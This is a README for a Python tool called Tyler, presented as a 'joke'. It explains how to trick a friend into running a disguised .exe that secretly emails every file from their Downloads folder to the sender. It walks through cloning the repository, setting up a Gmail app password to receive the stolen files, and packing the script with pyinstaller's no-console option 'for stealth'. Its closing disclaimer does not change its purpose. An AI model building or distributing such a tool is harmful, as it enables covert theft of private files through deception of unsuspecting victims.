# Tyler

📁 **Tyler** — this is a Python script for a "joke". The idea of ​​the script is that you ask your friend to open an .exe file under the pretext that you wrote a cool thing, but here's the problem, the script sends you all the files from the your friend "Downloads" folder to your email (if you are interested in another folder, you can change it in the code). The project is easy to run from the command line and can be packed using `pyinstaller`.

## 📦 Installation

Make sure you have Python 3.7+ installed and `pip`.

\`\`\`bash
git clone https://github.com/DENdidpip/Tyler
cd Tyler
\`\`\`

## 🚀 Setup

To launch the main script, you must go to the file "setup.py" and fill in all the information there. There is nothing complicated there, except for the line email_password

# How can you get it in Gmail

⚠️ This only works if you have two-step verification (2FA) enabled in Google. If you have it disabled, you will need to enable it first.

---

## 🔐 Steps:

1. Go to your Google account settings:
👉 https://myaccount.google.com/

2. In the menu on the left, select **"Security"**.

3. Enable **two-step verification**, if it is not enabled already.

4. After that, the **"App passwords"** section will appear.

Direct link (if available):
👉 https://myaccount.google.com/apppasswords

5. Select:
- Application: **"Mail"**
- Device: **"Other"** — enter, for example, `Python`

6. Google will generate a **16-digit code** — this is your `app_password`.
---

\`\`\`bash
python tr.py
\`\`\`

## 🧩 Build to .exe (for stealth when running the file, the console will not be displayed)

\`\`\`bash
pip install pyinstaller
pyinstaller --noconsole -F tr.py
\`\`\`

or worse choice

\`\`\`bash
pip install pyinstaller
pyinstaller -F tr.py
\`\`\`

After that, the .exe will appear in the dist/ folder, which you can send to your friend:)

## P.S.: not to be used for bad intentions!!!
